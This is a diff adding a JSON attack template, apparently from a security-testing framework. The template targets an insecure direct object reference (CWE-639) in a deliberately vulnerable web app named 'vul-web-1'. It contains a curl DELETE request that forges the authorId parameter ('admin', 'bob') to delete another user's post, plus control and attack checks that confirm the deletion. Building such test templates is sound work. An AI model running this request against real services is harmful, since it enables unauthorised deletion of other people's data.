@@ -1,0 +1,64 @@
+{
+  "templateId": "delete-author-tamper",
+  "attackType": {
+    "name": "idor",
+    "cwe": "CWE-639"
+  },
+  "dependency": {
+    "scope": "generic"
+  },
+  "target": {
+    "method": "DELETE",
+    "endpoint": "/api/posts/:id",
+    "application": "vul-web-1"
+  },
+  "request": {
+    "curl": "curl -s -X DELETE '{{origin}}/api/posts/{{postId}}?authorId={{victimAuthor}}'"
+  },
+  "blanks": {
+    "origin": {
+      "required": true,
+      "type": "url",
+      "desc": "타겟 origin",
+      "example": "http://127.0.0.1:3000"
+    },
+    "postId": {
+      "required": true,
+      "type": "int",
+      "desc": "삭제할 글 id",
+      "example": "1"
+    },
+    "victimAuthor": {
+      "required": true,
+      "type": "string",
+      "desc": "글 주인 계정으로 위조",
+      "example": "admin"
+    }
+  },
+  "payloads": [
+    "admin",
+    "bob"
+  ],
+  "verify": {
+    "mode": "idorDelete",
+    "control": {
+      "path": "/api/posts/1",
+      "authorId": "alice",
+      "expectStatus": 403
+    },
+    "attack": {
+      "path": "/api/posts/1",
+      "authorId": "admin",
+      "expectStatus": 200
+    },
+    "removedCheck": {
+      "path": "/api/posts",
+      "postId": 1
+    }
+  },
+  "executor": "repeater",
+  "mutating": true,
+  "origin": "human_authored",
+  "source": "team",
+  "trust": "confirmed"
+}
